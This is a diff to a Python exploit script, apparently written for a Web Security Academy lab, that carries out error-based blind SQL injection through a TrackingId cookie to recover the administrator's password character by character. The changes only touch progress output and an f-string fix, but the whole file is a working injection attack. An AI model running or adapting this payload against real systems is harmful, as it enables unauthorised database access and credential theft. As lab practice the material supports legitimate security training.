@@ -18,21 +18,22 @@ def enumerate_password(url, length):
     alphanumeric_characters = string.ascii_lowercase + string.digits
     password = ""
     print("Enumerating password...")
-    print("Password: ", end='')
     for i in range(1, length + 1):
         for j in alphanumeric_characters:
             payload = f"abc'||(SELECT CASE WHEN SUBSTR(password,{i},1)='{j}' THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')||'"
             response = requests.get(url, cookies={"TrackingId": payload})
             if response.status_code == 200:
                 password += j
-                print(j, end='', flush=True)
+                print('\r' + password, end='', flush=True)
                 break
+        else:
+            print('\r' + password + j, end='', flush=True)
 
 
 def main():
     if len(sys.argv) != 2:
         print(f"Usage: python3 {sys.argv[0]} <url>")
-        print("Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
+        print(f"Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
         sys.exit(1)
 
     url = sys.argv[1]
